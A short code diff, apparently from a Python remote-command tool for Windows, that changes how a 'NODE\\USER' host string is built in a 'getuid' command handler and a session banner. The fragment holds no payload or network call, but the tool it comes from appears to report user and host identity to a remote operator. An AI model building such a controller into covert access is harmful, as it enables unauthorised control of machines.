@@ -2358,7 +2358,7 @@ User Interface Commands
             send(str(PID))
             return
         case 'getuid':
-            send(os.path.join(NODE, USER))
+            send(NODE + '\\\\' + USER)
             return
         case 'config':
             send('''
@@ -4709,7 +4709,7 @@ GitHub: https://github.com/cppandpython
 AUTHOR: Vladislav Khudash
 VERSION: win32
 
-HOST: {NODE + os.sep + USER} 
+HOST: {NODE + "\\\\" + USER} 
 PLATFORM: {OS["platform"]} {OS["release"]} {OS["edition"]} 
 DATE: {session_date[0]} | {session_date[1]}
 '''
